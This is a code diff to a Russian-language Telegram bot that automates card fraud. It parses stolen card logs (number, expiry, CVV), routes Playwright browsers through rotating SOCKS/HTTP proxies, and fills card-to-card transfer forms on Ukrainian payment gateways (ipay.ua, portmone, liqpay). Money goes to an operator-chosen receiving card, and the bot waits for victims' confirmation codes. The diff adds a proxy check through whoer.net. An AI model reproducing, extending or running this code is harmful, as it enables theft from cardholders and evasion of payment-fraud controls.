@@ -17,7 +17,6 @@ import json
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DB_PATH = "/var/data/sessions.db"
-SCREENSHOTS_DIR = "/var/data/screenshots"
 
 # ========== FLASK ==========
 app = Flask(__name__)
@@ -31,7 +30,6 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 dp.middleware.setup(LoggingMiddleware())
 
-# ========== КНОПКИ ==========
 def get_main_menu():
     kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
@@ -40,7 +38,6 @@ def get_main_menu():
 # ========== БАЗА ==========
 def init_db():
     os.makedirs("/var/data", exist_ok=True)
-    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("""CREATE TABLE IF NOT EXISTS sessions (
@@ -61,7 +58,6 @@ def init_db():
     )""")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('card_to', '')")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy', '')")
-    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy_type', 'socks5')")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('rotation_url', '')")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('rotation_enabled', '0')")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('gateway', 'ipay')")
@@ -158,34 +154,6 @@ def parse_log(text):
     if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
     return data
 
-# ========== ПАРСЕР ПРОКСИ ==========
-def parse_proxy(raw):
-    raw = raw.strip()
-    ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', raw)
-    port_match = re.search(r':(\d{2,5})', raw)
-    if not ip_match or not port_match:
-        return None
-    ip = ip_match.group()
-    port = port_match.group(1)
-    login, password = None, None
-    if '@' in raw:
-        before_at = raw.split('@')[0]
-        if ':' in before_at:
-            creds = before_at.split(':')
-            if len(creds) >= 2:
-                login = creds[0]
-                password = creds[1]
-    else:
-        parts = re.split(r'[:@]', raw)
-        for i, part in enumerate(parts):
-            if part == ip:
-                if i > 0 and ':' not in parts[i-1] and parts[i-1] not in ['socks5', 'http', 'https']:
-                    login = parts[i-1]
-                if i+1 < len(parts) and ':' not in parts[i+1] and parts[i+1] != port:
-                    password = parts[i+1]
-                break
-    return {'ip': ip, 'port': port, 'login': login, 'password': password}
-
 # ========== ГЕНЕРАТОРЫ ==========
 def random_phone():
     return f"+380{random.randint(50,99)}{random.randint(1000000,9999999)}"
@@ -226,7 +194,53 @@ async def get_rotated_proxy():
         pass
     return get_setting('proxy')
 
-# ========== ОСНОВНАЯ ЭМУЛЯЦИЯ С СОХРАНЕНИЕМ КОНТЕКСТА ==========
+# ========== ПРОВЕРКА ПРОКСИ ЧЕРЕЗ WHOER ==========
+async def check_proxy(proxy_str: str) -> tuple:
+    """
+    Проверяет прокси через whoer.net.
+    Возвращает (True, тип_прокси, страна, IP) если успешно.
+    """
+    proxy_type = "http"
+    if proxy_str.startswith("socks5://") or proxy_str.startswith("socks://"):
+        proxy_type = "socks5"
+    elif not proxy_str.startswith(("http://", "https://", "socks5://", "socks://")):
+        if "@" in proxy_str:
+            parts = proxy_str.split("@")
+            if len(parts) == 2:
+                ip_port = parts[1]
+                if ":" in ip_port:
+                    proxy_str = f"socks5://{parts[0]}@{ip_port}"
+                else:
+                    return False, "Неверный формат. Нужно: login:pass@ip:port"
+            else:
+                return False, "Неверный формат. Нужно: login:pass@ip:port"
+        else:
+            if ":" in proxy_str:
+                proxy_str = f"socks5://{proxy_str}"
+            else:
+                return False, "Неверный формат. Нужно: ip:port или login:pass@ip:port"
+        proxy_type = "socks5"
+
+    try:
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(
+                headless=True,
+                proxy={"server": proxy_str} if proxy_str else None
+            )
+            context = await browser.new_context()
+            page = await context.new_page()
+            await page.goto("https://whoer.net", timeout=15000)
+            await asyncio.sleep(3)
+            ip_element = await page.query_selector('#ip')
+            country_element = await page.query_selector('#country')
+            ip = await ip_element.text_content() if ip_element else "не определен"
+            country = await country_element.text_content() if country_element else "не определена"
+            await browser.close()
+            return True, proxy_type, country.strip(), ip.strip()
+    except Exception as e:
+        return False, str(e)[:100]
+
+# ========== ОСНОВНАЯ ЭМУЛЯЦИЯ ==========
 async def emulate_payment(session_id, code=None, screenshot_only=False):
     session = get_session(session_id)
     if not session:
@@ -246,15 +260,9 @@ async def emulate_payment(session_id, code=None, screenshot_only=False):
     else:
         proxy_str = get_setting('proxy')
     
-    proxy_type = get_setting('proxy_type') or 'socks5'
     proxy_config = None
     if proxy_str:
-        parsed = parse_proxy(proxy_str)
-        if parsed:
-            proxy_config = {"server": f"{proxy_type}://{parsed['ip']}:{parsed['port']}"}
-            if parsed['login'] and parsed['password']:
-                proxy_config["username"] = parsed['login']
-                proxy_config["password"] = parsed['password']
+        proxy_config = {"server": proxy_str}
 
     phone = random_phone()
     name = random_name()
@@ -269,57 +277,46 @@ async def emulate_payment(session_id, code=None, screenshot_only=False):
             )
             page = await context.new_page()
 
-            # === IPAY ===
             if gateway == "ipay":
-                await page.goto("https://ipay.ua/card2card", timeout=15000)
-                await page.fill('input[name="card_from"]', card, timeout=5000)
-                await page.fill('input[name="expiry"]', expiry, timeout=5000)
-                await page.fill('input[name="cvv"]', cvv, timeout=5000)
-                await page.fill('input[name="card_to"]', card_to, timeout=5000)
-                await page.fill('input[name="amount"]', str(amount), timeout=5000)
-                await page.fill('input[name="recipient_name"]', name, timeout=5000)
-                await page.fill('input[name="recipient_phone"]', phone, timeout=5000)
+                await page.goto("https://ipay.ua/card2card", timeout=20000)
+                await page.fill('input[name="card_from"]', card, timeout=10000)
+                await page.fill('input[name="expiry"]', expiry, timeout=10000)
+                await page.fill('input[name="cvv"]', cvv, timeout=10000)
+                await page.fill('input[name="card_to"]', card_to, timeout=10000)
+                await page.fill('input[name="amount"]', str(amount), timeout=10000)
+                await page.fill('input[name="recipient_name"]', name, timeout=10000)
+                await page.fill('input[name="recipient_phone"]', phone, timeout=10000)
 
-            # === PORTMONE ===
             elif gateway == "portmone":
-                await page.goto("https://portmone.com.ua/card2card", timeout=15000)
-                await page.fill('input[name="card_from"]', card, timeout=5000)
-                await page.fill('input[name="expiry"]', expiry, timeout=5000)
-                await page.fill('input[name="cvv"]', cvv, timeout=5000)
-                await page.fill('input[name="card_to"]', card_to, timeout=5000)
-                await page.fill('input[name="amount"]', str(amount), timeout=5000)
-                await page.fill('input[name="name"]', name, timeout=5000)
+                await page.goto("https://portmone.com.ua/card2card", timeout=20000)
+                await page.fill('input[name="card_from"]', card, timeout=10000)
+                await page.fill('input[name="expiry"]', expiry, timeout=10000)
+                await page.fill('input[name="cvv"]', cvv, timeout=10000)
+                await page.fill('input[name="card_to"]', card_to, timeout=10000)
+                await page.fill('input[name="amount"]', str(amount), timeout=10000)
+                await page.fill('input[name="name"]', name, timeout=10000)
 
-            # === LIQPAY ===
             elif gateway == "liqpay":
-                await page.goto("https://liqpay.ua/ru/order", timeout=15000)
-                await page.fill('input[name="card"]', card, timeout=5000)
-                await page.fill('input[name="expiry"]', expiry, timeout=5000)
-                await page.fill('input[name="cvv"]', cvv, timeout=5000)
-                await page.fill('input[name="amount"]', str(amount), timeout=5000)
-                await page.fill('input[name="name"]', name, timeout=5000)
+                await page.goto("https://liqpay.ua/ru/order", timeout=20000)
+                await page.fill('input[name="card"]', card, timeout=10000)
+                await page.fill('input[name="expiry"]', expiry, timeout=10000)
+                await page.fill('input[name="cvv"]', cvv, timeout=10000)
+                await page.fill('input[name="amount"]', str(amount), timeout=10000)
+                await page.fill('input[name="name"]', name, timeout=10000)
 
-            # Сохраняем контекст для скриншотов
-            context_data = {"page": page, "browser": browser, "context": context}
-            save_page_context(session_id, {"browser_id": id(browser)})
-
-            # Если только скриншот
             if screenshot_only:
                 screenshot = await page.screenshot(full_page=True)
                 await bot.send_photo(chat_id=ADMIN_ID, photo=screenshot, caption=f"📸 Скриншот | {gateway.upper()}")
                 await browser.close()
                 return "screenshot_sent"
 
-            # === НАЖАТИЕ ОПЛАТИТЬ ===
-            await page.click('button[type="submit"]', timeout=5000)
-            await asyncio.sleep(2)
+            await page.click('button[type="submit"]', timeout=10000)
+            await asyncio.sleep(3)
 
-            # === СКРИНШОТ ПОСЛЕ ОТПРАВКИ ===
             screenshot = await page.screenshot(full_page=True)
             await bot.send_photo(chat_id=ADMIN_ID, photo=screenshot, caption=f"💳 {gateway.upper()} | {amount} UAH")
 
-            # === ПРОВЕРКА КОДА ===
-            if await page.is_visible('input[name="code"]', timeout=3000):
+            if await page.is_visible('input[name="code"]', timeout=5000):
                 if code:
                     await page.fill('input[name="code"]', code, timeout=5000)
                     await page.click('button[type="submit"]', timeout=5000)
@@ -328,11 +325,11 @@ async def emulate_payment(session_id, code=None, screenshot_only=False):
                     return "✅ Платёж подтверждён!"
                 else:
                     await asyncio.sleep(60)
-                    if await page.is_visible('button:has-text("Отправить код")', timeout=3000):
-                        await page.click('button:has-text("Отправить код")', timeout=3000)
+                    if await page.is_visible('button:has-text("Отправить код")', timeout=5000):
+                        await page.click('button:has-text("Отправить код")', timeout=5000)
                         return "waiting_code"
             
-            if await page.is_visible('.success', timeout=3000):
+            if await page.is_visible('.success', timeout=5000):
                 await browser.close()
                 return "✅ Платёж выполнен успешно!"
             
@@ -343,7 +340,7 @@ async def emulate_payment(session_id, code=None, screenshot_only=False):
     except Exception as e:
         return f"❌ Ошибка Playwright: {str(e)[:150]}"
 
-# ========== КОМАНДЫ ==========
+# ========== ОБРАБОТЧИКИ КОМАНД ==========
 @dp.message_handler(commands=['start'])
 async def start_cmd(msg: types.Message):
     if msg.from_user.id != ADMIN_ID: return
@@ -362,7 +359,6 @@ async def admin_panel(msg: types.Message):
         InlineKeyboardButton("💳 Карта", callback_data="change_card"),
         InlineKeyboardButton("🌐 Шлюз", callback_data="change_gateway"),
         InlineKeyboardButton("🔄 Прокси", callback_data="change_proxy"),
-        InlineKeyboardButton("🔄 Тип прокси", callback_data="change_proxy_type"),
         InlineKeyboardButton("🔁 Ротация", callback_data="toggle_rotation"),
         InlineKeyboardButton("🗑 Удалить прокси", callback_data="delete_proxy"),
         InlineKeyboardButton("📋 Статус", callback_data="show_status"),
@@ -411,37 +407,19 @@ async def settings_callback(callback: types.CallbackQuery):
     action = callback.data.split("_")[1]
     prompts = {
         "card": "Введите номер карты получателя (15-16 цифр):",
-        "proxy": "Введите прокси в любом формате:",
-        "proxy_type": "Выберите тип:",
+        "proxy": "Введите прокси в любом формате (ip:port, login:pass@ip:port, http://...). Я определю сам.",
     }
-    if action == "proxy_type":
-        kb = InlineKeyboardMarkup(row_width=2)
-        kb.add(
-            InlineKeyboardButton("SOCKS5", callback_data="set_type_socks5"),
-            InlineKeyboardButton("HTTP", callback_data="set_type_http"),
-        )
-        await callback.message.reply("Выберите тип:", reply_markup=kb)
-        await callback.answer()
-        return
     await callback.message.reply(prompts.get(action, "Ошибка"))
-    await callback.answer()
-
-@dp.callback_query_handler(lambda c: c.data.startswith("set_type_"))
-async def set_proxy_type(callback: types.CallbackQuery):
-    ptype = callback.data.split("_")[2]
-    set_setting('proxy_type', ptype)
-    await callback.message.reply(f"✅ Тип: {ptype.upper()}")
     await callback.answer()
 
 @dp.callback_query_handler(lambda c: c.data == "show_status")
 async def show_status(callback: types.CallbackQuery):
     card = get_setting('card_to') or "не задана"
     proxy = get_setting('proxy') or "не задан"
-    ptype = get_setting('proxy_type') or "socks5"
     rotation = "включена" if get_setting('rotation_enabled') == '1' else "выключена"
     gateway = get_setting('gateway') or "не выбран"
     await callback.message.reply(
-        f"📊 Настройки:\n💳 Карта: {card}\n🌐 Шлюз: {gateway.upper()}\n🔄 Прокси: {proxy}\n📌 Тип: {ptype.upper()}\n🔁 Ротация: {rotation}"
+        f"📊 Настройки:\n💳 Карта: {card}\n🌐 Шлюз: {gateway.upper()}\n🔄 Прокси: {proxy}\n🔁 Ротация: {rotation}"
     )
     await callback.answer()
 
@@ -492,13 +470,20 @@ async def handle_all_reply(msg: types.Message):
             await msg.reply("❌ 15 или 16 цифр.")
         return
 
-    if "прокси" in text and "ротации" not in text:
-        parsed = parse_proxy(user_input)
-        if parsed:
+    if "прокси" in text:
+        await msg.reply("🔄 Проверяю прокси через whoer.net...")
+        ok, *result = await check_proxy(user_input)
+        if ok:
             set_setting('proxy', user_input)
-            await msg.reply(f"✅ Прокси сохранён.")
+            proxy_type, country, ip = result
+            await msg.reply(
+                f"✅ Прокси сохранён:\n"
+                f"📌 Тип: {proxy_type.upper()}\n"
+                f"🌍 Страна: {country}\n"
+                f"📡 IP: {ip}"
+            )
         else:
-            await msg.reply("❌ Не распознан. Формат: ip:port или login:pass@ip:port")
+            await msg.reply(f"❌ Прокси не отвечает: {result[0]}")
         return
 
     if "ссылку для ротации" in text:
